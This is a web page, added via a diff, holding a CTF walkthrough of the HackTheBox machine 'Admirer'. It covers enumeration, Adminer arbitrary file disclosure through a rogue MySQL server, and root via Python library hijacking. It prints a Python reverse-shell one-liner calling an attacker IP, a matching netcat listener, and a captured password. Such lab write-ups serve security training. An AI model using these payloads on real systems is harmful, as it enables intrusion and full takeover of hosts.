@@ -1,0 +1,148 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Admirer HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/admirer-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-29T15:40:26+00:00">January 29, 2021</time><time class="updated" datetime="2025-06-23T09:25:23+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Admirer. It was created by polarbearer and GibParadox. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Enumerating FTP Service</span></li>
+<li><span style="color: #000000;">Enumerating Backup Files</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Detecting Vulnerable Adminer</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Configuring MySQL</span></li>
+<li><span style="color: #000000;">Creating user and Database in MySQL</span></li>
+<li><span style="color: #000000;">Connecting the local MySQL with adminer</span></li>
+<li><span style="color: #000000;">Running Query for Arbitrary File Disclosure</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Escalating Privilege using Python Library Hijacking</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: 10.129.77.71</span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan. To get in-depth details of the machine. We ran a Nmap Version Scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.77.71</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3IdmtwSuKBs/YBQktPFQLNI/AAAAAAAAtKA/HcNB8ZoYNmIPi8ofXOdzgTpUEXYo2OynwCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 21 (FTP), 22 (SSH), 80 (HTTP). The scan also reveals that there is a robots.txt file present on the server. It contains a disallowed entry (/admin-dir) in it.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We started our Enumeration with the HTTP Service. We ran the browser and opened the IP Address of the machine. It gave us a webpage with some images. Then, clicking on the images enlarges them with some text written on them. It contains a Contact US form as well. But it is mostly aesthetic. Nothing seems to be functional.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.71</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KJyHQf36yDU/YBQn32GLpWI/AAAAAAAAtKI/cRN5sgp2_B0bMhaRJgioipqFK1Pse7LcQCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">We went back to the Nmap Scan performed earlier. We tried to access the /admin-dir directory that was extracted from the robots.txt file on the target server.     </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.71/admin-dir/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VGtiZqyIQoM/YBQoCpp5J-I/AAAAAAAAtKM/h3Y8MCKIw4sbfvqBOfwh6ZyDfJHDcCwgQCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">At this moment usually, we perform a Directory Bruteforce. We will be suing the go buster for that. We tried multiple dictionaries but we got some success with the big.txt working with the .txt extension as shown in the image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir -u http://10.129.77.71/admin-dir/ -w /usr/share/wordlists/dirb/big.txt -x .txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z2gEVD8Lz4Y/YBQoGZoMfzI/AAAAAAAAtKQ/riX-mCs97EInyESvzi2D962iAApVX9AQQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">The gobuster gave us 2 files. ‘contacts.txt’ and ‘credentials.txt’. Let’s check credentials.txt file first. We saw that there are the credentials for the FTP.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.71/admin-dir/credentials.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F55ETLEV3PM/YBQoL7AF9lI/AAAAAAAAtKY/4ffltRDW6JYizU_oQd7K-ot75B3bLiQdwCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We tried logging in using the credentials provided. Then, we listed the contents on the FTP server and found a dump.sql database file and html.tar.gz compressed file. We downloaded them to our local system using the get command. After downloading, firstly we extracted the html.tar.gz file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-itQYWTB71OE/YBQoQq0IN3I/AAAAAAAAtKc/iN2pMt3J2FcPoTIM7QW49819UewJgfPUQCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">A close inspection of the extracted files can tell us that it is basically a backup of the website source code. While traversing in hope for some credentials, we stumbled upon a directory by the name of ‘utility-scripts/’.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X2ZK1S07kPA/YBQoWK1a8RI/AAAAAAAAtKk/IBaknnOo1w4I3ziV1plFedQV33nkqfh6ACLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">As it is the backup version, it might exist on the live site as well. To give it a try, we tried accessing the utility-scripts directory on the server to find a 403 Forbidden Error. This means that the although inaccessible but it does exist on the server. Let’s examine these files here on the shell. The phptest.php simple gives output “Just a test to see if PHP works.” Moving on the info.php page informs about the PHP version and the location of the site.  Then we have the admin_tasks.php. It just has a bunch of tasks that we can go through and execute those commands on the system. But as we figured earlier that all these scripts are forbidden. However, we can’t just give up. We tried directory Bruteforce with the php extensions in hope for any particular file that might be accessible on the live server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir -u http://10.129.77.71/utility-scripts/ -w /usr/share/wordlists/dirb/big.txt -x .php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TAQ4tyRmG8Y/YBQob5GQPoI/AAAAAAAAtKs/JA-hqrgrloMm33iMDX8ose5m42Y7V2G8gCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">The Gobuster scan was a success. It gave us the /adminer.php file. As it gave a 200 OK status, it is not forbidden. We tried opening it and found that it is an MYSQL database management tool. We have the version written here. Time to get to enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.77.71utility-scripts/adminer.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--X7nlOj0vMw/YBQog9Rl0II/AAAAAAAAtK0/eXt0qBn0S6orkYzQ_mFgvFUNOjaGT_JQQCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">There was no need for a deep search, just a basic google search gave a step-by-step method to exploit the adminer.</span></p>
+<p><span style="color: #000000;">Reference: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">Foregenix Blog</a></strong></span></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JvIf-XB8oNw/YBQom5CQWTI/AAAAAAAAtK4/ShXMzMO8ZEMTnTdc-rKpm733TKZUk5OjwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">The vulnerability that adminer suffers from is generally called Arbitrary File Disclosure. If we have to categorise it according to OWASP Top 10 (2017), it will fall on the lines of Sensitive Data Exposure. Basically, Attackers can take advantage of this vulnerability to fetch passwords for any CMS installed from the database or gain the full access of the database.</span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">To exploit this vulnerability, we need to configure a MySQL server on our Kali Linux. Then continue to add table and columns in it. Here we have already set up a MySQL server. After configuring, we login into the MySQl and create a user raaj and continue to provide it all the Privileges. After that, we Flush those actions and then we get ahead to create a database by the same name as the target machine “adminer”. Then we create a table by then the name of the demo with the name column in it. After doing all this we exit from the MySQL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl start mysql
+mysql -u root -p
+CREATE USER 'raaj'@'%' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON *.* TO 'raaj'@'%';
+FLUSH PRIVILEGES;
+create database admirer;
+use admirer;
+create table demo(name varchar(255));
+exit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6Mle6z95ewQ/YBQosdYDJuI/AAAAAAAAtK8/P3EfRJKmQkoTfmIbeBeuVCVFerCWmuRHgCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">At this stage, if you have a firewall policy then amend it to allow connections locally. After that, we need to configure MySQL to bind with the local address. This can be done by editing the conf file in /etc/mysql.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/mysql/mariadb.conf.d/50-server.cnf</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w4kuDab9s0g/YBQoxZDrE4I/AAAAAAAAtLA/tAb0SEy8MmMh3NfyGK3zlrIfwVQrbsxygCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Now that all is set, we restart the mysql and head to the Adminer page. Here we use the credentials we created earlier with the IP address provided by the HTB VPN. We also provide the password we created and the database name we are trying to access.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_ztZdMltYcE/YBQo3R0WL9I/AAAAAAAAtLE/J92lkZwqYzkfLnmnf69HfUdJcJ5eUTrXQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">After logging in, it’s time to get the data to form the target machine’s database to our newly created database. To do that, we need to execute the “load data local infile” query. Since due to the availability of the current user on the target machine i.e., www-data. We can access the live site data that we previously discovered from php.info file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">load data local infile '../index.php'
+into table demo
+fields terminated by "/n"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GbRaB0UiZ14/YBQo8oXQPAI/AAAAAAAAtLM/53M6OztRGkQ0ud4q_CuPO29azAyc2wvGACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">The execution of the query gets us the set of credentials for waldo user as shown in the image below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: waldo
+Password: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cAd87IXN_Ig/YBQpB_q8srI/AAAAAAAAtLQ/QUxV0mXy6_4dgdoS1fPgU3eNlx45GHF9wCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Using this set of newly found credentials for the user waldo, we tried to ssh into the target machine.</span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">After login, we start enumerating for privilege escalation. We ran the sudo -l command to list binaries or scripts with sudo permission that we can exploit to elevate privilege to root. We see that we have the setenv binary. It is used to set the environment variables and we see that we it is set on the admin_tasks.sh script. Now, to proceed further, we need to take a look at this admin_task.sh scripts. After listing the contents of the /opt/scripts/ directory, we found that there is a backup.py script as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7v3czsvQbOw/YBQpHECMomI/AAAAAAAAtLY/mSke86B0g5kDZADjIKXqtkg_A3QenZUyQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We took a look into the backup.py file to see that it is importing make_archive from the shutil library and take the contents of the /var/www/html/ to /var/backups/html. With the combination of the sudo permission setenv binary and the usage of shutil library, we can elevate privileges here. To do this we will need to create a version of shutil library with a reverse shell python script which will indeed get executed via admin_tasks.sh to give us back a root shell. Also, we can read the user flag at this moment.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat backup.py
+cat /home/waldo/user.txt
+mkdir /tmp/raj
+nano /tmp/raj/shutil.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UzyrxzCHc0s/YBQpM_54D3I/AAAAAAAAtLg/s9MUStNFOi8Ymmd6bVdxyP5cmTNSmSVHwCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Now that we have created a shutil.py in the tmp directory, we need to inject it with the reverse shell code as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.52",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E4oSUWdnlYI/YBQpSccG2_I/AAAAAAAAtLo/Gt-OWe59OLIhtwwKaE01jmTvlAzTHvfxQCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Then, we use the sudo to change add the /tmp/ directory as the environment variable that will allow python to use our shutil.py file. After running the admin_tasks.sh, we need to trigger the backup.py which can call to shutil.py. Before doing this ensure that a listener is running with the port mentioned on the payload so that when the session is created, it can be accessed.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo PYTHONPATH=/tmp/raj /opt/scripts/admin_tasks.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j6W4tr3_ads/YBQpXI7ET9I/AAAAAAAAtLw/qEYSazYZcZUjVJv0Ehaj4nMBx2gXdGL4ACLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Without taking much time, we have to root shell on the target machine. After reading the root flag we can conclude this CTF Challenge.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c18PsD0pXnE/YBQpcAZOliI/AAAAAAAAtL0/zvtzxKAhDZARdnC5fje-r2q1t6VdZr2BQCLcBGAsYHQ/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/cap-hackthebox-walkthrough/" title="CAP HacktheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">CAP HacktheBox Walkthrough</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/writer-hackthebox-walkthrough/" title="Writer HackTheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Writer HackTheBox Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/" rel="prev">Comprehensive Guide on Dirsearch</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/port-forwarding-tunnelling-cheatsheet/" rel="next">Port Forwarding &amp; Tunnelling Cheatsheet</a></div></div>
+	</nav>        </div>
